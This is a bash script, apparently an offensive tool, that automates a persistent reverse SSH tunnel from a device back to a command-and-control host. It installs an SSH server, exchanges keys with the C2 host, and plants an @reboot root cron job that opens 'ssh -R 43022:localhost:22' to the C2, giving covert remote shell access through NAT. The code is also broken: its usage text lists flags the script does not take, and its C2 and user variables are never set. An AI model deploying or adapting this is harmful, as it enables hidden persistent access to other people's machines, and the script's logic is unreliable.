#!/bin/bash

################################################################
#                                                              #
# Let's setup an automated reverse ssh device!                 #
#                                                              #
#                                                              #
# xoxo Hexadecim8 did this xoxo                                #
#                                                              #
################################################################


USAGE="
A bash script to automate reverse a reverse ssh tunnel. Handy for callbacks
through NAT.
Flags:
  -a	Specify AWS C2 infrastructure.
  -k    SSH key.
  -n    Password based C2 access.
  -c    C2 host <ip address or routable hostname>.
  -u	C2 username.
  -l    Local username to use.
  -h	Help text and usage example.
usage:	 girltalk.sh -c <C2 username> -l <local username> -p <password> -c <domain controller> -o <outputFileName.ldif>
example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface
"

# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi

# Set flags.
while getopts "a:k:n:c::u:l:h" FLAG
do
	case $FLAG in
		a)
			AWS=$OPTARG
			;;
		k)
			KEY=$OPTARG
			;;
		n)
			NONAWS=$OPTARG
			;;
		c)
			HOST=$OPTARG
			;;
		u)
			USERNAME=$OPTARG
			;;
		l)
			LOCAL=$OPTARG
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done

# Make sure each required flag was actually set.
if [ -z ${USERNAME+x} ]; then
	echo "Remote username (-u) is not set."
	echo "$USAGE"
	exit
elif [ -z ${LOCAL+x} ]; then
	echo "Local username (-l) is not set."
	echo "$USAGE"
	exit
elif [ -z ${HOST+x} ]; then
	echo "Remote C2 hostname (-c) is not set."
	echo "$USAGE"
	exit
fi

if [ ${AWS} = true]; then
	echo "it works!"
fi

#Check for connectivity
echo "### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "IPv4 is up"
    printf "\n"

#Installing deps
if (systemctl -q is-active sshd.service)
then
    echo "### SSH is Installed And Running! ###"
else
    echo "### Installing Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"
    echo "### Starting SSH Service & Enabling On Reboot ###"
    sudo systemctl start ssh && sudo systemctl enable ssh
fi
    printf "\n"

#Generate local key
    echo "### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"

#Provide a valid username local to this host for login
#    echo "Please enter your local username"
#    echo ">>> You will use this user's account to log in from your C2! <<<"
#    read user

#Error checking for user input
    until id "$USERNAME" >/dev/null; do
        echo "Please enter your local username";
#        read user;
    done
#    printf "\n"

#Takes input for what remote host you want to route through
#    echo "Please enter username/IP for desired C2 host (<username>@<C2_host>)"
#    read C2
#    printf "\n"

#Transfer local key to C2
    echo "### Copying key to C2 host ###"
    ssh-copy-id $C2
    printf "\n"

#Generating an ssh key on your C2
   ssh $C2 'ssh-keygen'

#Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
echo "### Creating & transferring remote connection script"
echo "ssh-copy-id ${user}@localhost -p 43022 && ssh ${user}@localhost -p 43022" > /home/$user/hmu_$user.sh
sudo chmod 777 /home/$user/hmu_$user.sh 
scp /home/$user/hmu_$user.sh $C2:/root

#Setup local cron job + cleanup
    echo "### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo -u ${user} ssh -f -N -R 43022:localhost:22 ${C2}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

#Finishing script
    echo "### donezo! Please reboot the machine. ###"

else
    echo "Please check your network connection"

fi